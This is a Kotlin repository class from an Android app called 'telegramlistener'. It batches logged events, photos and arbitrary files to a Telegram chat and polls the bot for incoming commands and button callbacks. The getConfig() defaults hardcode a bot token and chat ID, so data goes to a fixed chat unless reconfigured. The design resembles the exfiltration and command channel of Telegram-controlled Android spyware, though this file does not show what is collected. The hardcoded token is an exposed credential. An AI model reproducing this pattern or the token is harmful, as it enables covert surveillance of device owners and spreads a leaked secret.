package com.example.telegramlistener.data.repo

import android.content.Context
import androidx.core.content.edit
import com.example.telegramlistener.data.local.Event
import com.example.telegramlistener.data.local.EventDao
import com.example.telegramlistener.data.remote.TelegramApi
import com.example.telegramlistener.data.remote.InlineKeyboardMarkup
import com.example.telegramlistener.data.remote.Message
import com.example.telegramlistener.data.remote.Update
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import javax.inject.Inject
import javax.inject.Singleton
import android.util.Log
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody

interface EventRepository {
    suspend fun logEvent(type: String, payload: String)
    suspend fun syncEvents(): Boolean
    fun saveConfig(botToken: String, chatId: String)
    fun getConfig(): Pair<String, String>
    suspend fun getChatId(token: String): String?
    suspend fun getUnprocessedUpdates(offset: Long): List<Update>
    suspend fun sendMessage(text: String, threadId: Int? = null, replyMarkup: InlineKeyboardMarkup? = null): Message?
    suspend fun editMessage(messageId: Long, text: String, replyMarkup: InlineKeyboardMarkup? = null): Boolean
    suspend fun clearAllEvents()
    
    // Media
    suspend fun sendPhoto(fileId: java.io.File, caption: String? = null, threadId: Int? = null): Boolean
    suspend fun sendFile(file: java.io.File, caption: String? = null, threadId: Int? = null): Boolean
    suspend fun deleteTopic(threadId: Int): Boolean
    suspend fun answerCallbackQuery(queryId: String): Boolean

    // Dashboard specific
    fun setLastDashboardId(id: Long)
    fun setLastDashboardThreadId(id: Int)
    fun getLastDashboardId(): Long
    fun getLastDashboardThreadId(): Int
    
    // Offset Management
    fun getLastUpdateId(): Long
    fun setLastUpdateId(id: Long)

    // Service State
    fun setServiceRunning(isRunning: Boolean)
    fun getServiceRunning(): kotlinx.coroutines.flow.Flow<Boolean>
}

@Singleton
class EventRepositoryImpl @Inject constructor(
    private val dao: EventDao,
    private val api: TelegramApi,
    @ApplicationContext private val context: Context
) : EventRepository {

    private val prefs = context.getSharedPreferences("telegram_listener_prefs", Context.MODE_PRIVATE)

    override suspend fun logEvent(type: String, payload: String) {
        dao.insert(Event(type = type, payload = payload))
    }

    override suspend fun syncEvents(): Boolean = withContext(Dispatchers.IO) {
        val (token, chatId) = getConfig()
        if (token.isEmpty() || chatId.isEmpty()) return@withContext false

        val events = dao.getOldestEvents(10)
        if (events.isEmpty()) return@withContext true

        val message = events.joinToString("\n") { "[${it.type}] ${it.payload}" }
        
        try {
            val response = api.sendMessage(token, chatId, message, "Markdown")
            if (response.isSuccessful && response.body()?.ok == true) {
                dao.delete(events)
                return@withContext true
            }
        } catch (e: Exception) {
            Log.e("EventRepository", "Sync failed", e)
        }
        return@withContext false
    }

    override fun saveConfig(botToken: String, chatId: String) {
        prefs.edit {
            putString("bot_token", botToken)
            putString("chat_id", chatId)
        }
    }

    override fun getConfig(): Pair<String, String> {
        return Pair(
            prefs.getString("bot_token", "8235584686:AAEyIvuCQcL5GxynKyiXOKwyY47iV3y5CQg") ?: "8235584686:AAEyIvuCQcL5GxynKyiXOKwyY47iV3y5CQg",
            prefs.getString("chat_id", "1400686945") ?: "1400686945"
        )
    }

    override suspend fun getChatId(token: String): String? {
        return try {
            val response = api.getUpdates(token)
            if (response.isSuccessful) {
                val result = response.body()?.result
                result?.lastOrNull()?.message?.chat?.id?.toString()
            } else {
                null
            }
        } catch (e: Exception) {
            Log.e("EventRepository", "GetChatId failed", e)
            null
        }
    }

    override suspend fun getUnprocessedUpdates(offset: Long): List<Update> {
        val (token, _) = getConfig()
        if (token.isEmpty()) {
            Log.e("EventRepository", "Token is empty!")
            return emptyList()
        }

        return try {
            // Log.d("EventRepository", "Polling updates with offset: $offset")
            val response = api.getUpdates(token, offset = offset, timeout = 30)
            if (response.isSuccessful) {
                val updates = response.body()?.result ?: emptyList()
                if (updates.isNotEmpty()) {
                    Log.d("EventRepository", "Got ${updates.size} updates from API")
                }
                updates
            } else {
                Log.e("EventRepository", "Update poll failed: ${response.code()} ${response.message()}")
                val errorBody = response.errorBody()?.string()
                Log.e("EventRepository", "Error Body: $errorBody")
                emptyList()
            }
        } catch (e: Exception) {
            Log.e("EventRepository", "Update poll error", e)
            emptyList()
        }
    }

    override suspend fun sendMessage(text: String, threadId: Int?, replyMarkup: InlineKeyboardMarkup?): Message? {
        val (token, chatId) = getConfig()
        if (token.isEmpty() || chatId.isEmpty()) return null
        return try {
            val response = api.sendMessage(token, chatId, text, "Markdown", threadId, replyMarkup)
            if (response.isSuccessful && response.body()?.ok == true) {
                response.body()?.result
            } else {
                Log.e("EventRepository", "Send failed: ${response.errorBody()?.string()}")
                null
            }
        } catch (e: Exception) {
            Log.e("EventRepository", "Send error", e)
            null
        }
    }

    override suspend fun editMessage(messageId: Long, text: String, replyMarkup: InlineKeyboardMarkup?): Boolean {
        val (token, chatId) = getConfig()
        if (token.isEmpty() || chatId.isEmpty()) return false
        return try {
            val response = api.editMessageText(token, chatId, messageId, text, "Markdown", replyMarkup)
            response.isSuccessful && response.body()?.ok == true
        } catch (e: Exception) {
            Log.e("EventRepository", "Edit error", e)
            false
        }
    }

    override suspend fun clearAllEvents() {
        dao.deleteAllEvents()
    }

    override fun setLastDashboardId(id: Long) {
        prefs.edit { putLong("last_dashboard_id", id) }
    }

    override fun setLastDashboardThreadId(id: Int) {
        prefs.edit { putInt("last_dashboard_thread_id", id) }
    }

    override fun getLastDashboardId(): Long {
        return prefs.getLong("last_dashboard_id", 0L)
    }

    override fun getLastDashboardThreadId(): Int {
        return prefs.getInt("last_dashboard_thread_id", 0)
    }

    override fun getLastUpdateId(): Long {
        return prefs.getLong("last_update_id", 0L)
    }

    override fun setLastUpdateId(id: Long) {
        prefs.edit { putLong("last_update_id", id) }
    }
    
    // Service State Implementation
    private val _serviceRunState = kotlinx.coroutines.flow.MutableStateFlow(false)
    
    override fun setServiceRunning(isRunning: Boolean) {
        _serviceRunState.value = isRunning
    }
    
    override fun getServiceRunning(): kotlinx.coroutines.flow.Flow<Boolean> {
        return _serviceRunState
    }

    override suspend fun sendPhoto(fileId: java.io.File, caption: String?, threadId: Int?): Boolean {
        val (token, chatId) = getConfig()
        if (token.isEmpty() || chatId.isEmpty()) return false
        
        return try {
            val requestFile = fileId.asRequestBody("image/*".toMediaTypeOrNull())
            val body = okhttp3.MultipartBody.Part.createFormData("photo", fileId.name, requestFile)
            val response = api.sendPhoto(token, chatId, body, caption, threadId)
            response.isSuccessful && response.body()?.ok == true
        } catch (e: Exception) {
            Log.e("EventRepository", "Send photo error", e)
            false
        }
    }

    override suspend fun sendFile(file: java.io.File, caption: String?, threadId: Int?): Boolean {
        val (token, chatId) = getConfig()
        if (token.isEmpty() || chatId.isEmpty()) return false
        
        return try {
            val requestFile = file.asRequestBody("multipart/form-data".toMediaTypeOrNull())
            val body = okhttp3.MultipartBody.Part.createFormData("document", file.name, requestFile)
            val response = api.sendDocument(token, chatId, body, caption, threadId)
            response.isSuccessful && response.body()?.ok == true
        } catch (e: Exception) {
            Log.e("EventRepository", "Send file error", e)
            false
        }
    }

    override suspend fun deleteTopic(threadId: Int): Boolean {
        val (token, chatId) = getConfig()
        if (token.isEmpty() || chatId.isEmpty()) return false
        
        return try {
            val response = api.deleteForumTopic(token, chatId, threadId)
            response.isSuccessful && response.body()?.ok == true
        } catch (e: Exception) {
            Log.e("EventRepository", "Delete topic error", e)
            false
        }
    }

    override suspend fun answerCallbackQuery(queryId: String): Boolean {
        val (token, _) = getConfig()
        if (token.isEmpty()) return false
        return try {
            api.answerCallbackQuery(token, queryId)
            true
        } catch (e: Exception) {
            false
        }
    }
}
